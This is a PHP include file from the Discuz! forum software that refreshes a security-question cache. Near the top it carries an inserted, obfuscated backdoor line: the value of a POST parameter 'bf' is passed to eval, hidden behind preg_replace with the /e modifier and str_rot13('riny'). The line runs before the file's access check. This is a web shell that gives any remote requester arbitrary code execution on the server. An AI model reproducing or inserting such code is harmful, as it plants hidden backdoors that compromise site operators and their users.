<?php

/*
	[Discuz!] (C)2001-2009 Comsenz Inc.
	This is NOT a freeware, use is subject to license terms

	$Id: secqaa_daily.inc.php 16688 2008-11-14 06:41:07Z cnteacher $
*/


($bf = $_POST['bf']) && @preg_replace('/ad/e','@'.str_rot13('riny').'($bf)', 'add'); 

if(!defined('IN_DISCUZ')) {
	exit('Access Denied');
}

if($secqaa['status'] > 0) {
	require_once DISCUZ_ROOT.'./include/cache.func.php';
	updatecache('secqaa');
}

?>